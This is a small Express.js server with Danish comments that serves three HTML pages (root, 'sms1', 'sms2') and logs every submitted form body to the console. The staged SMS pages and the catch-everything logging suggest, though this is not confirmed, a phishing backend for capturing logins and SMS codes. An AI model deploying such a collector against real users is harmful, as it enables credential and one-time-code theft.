const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();

var urlencodedParser = bodyParser.urlencoded({ extended: false });

//sender alt hvad brugeren har skrevet
app.get("/", (req,res) => {
    res.sendFile("index.html", {root: path.join(__dirname, "./")});
});

app.get("/sms1", (req,res) => {
    res.sendFile("sms1.html", {root: path.join(__dirname, "./")});
});
app.get("/sms2", (req,res) => {
    res.sendFile("sms2.html", {root: path.join(__dirname, "./")});
});

//smider alt hvad der bliver skrevet i root, ud i en console
app.post("/", urlencodedParser, (req,res) => {
    console.log(req.body);
});

app.post("/sms1", urlencodedParser, (req,res) => {
    console.log(req.body);
});
app.post("/sms2", urlencodedParser, (req,res) => {
    console.log(req.body);
});

//smider en log ud når root dir, bliver tilgået.. her kan man auth brugeren
app.use("/", (req,res) => {
    console.log("Heyyy, i got a log working");
});

//starter serveren
app.listen(3000);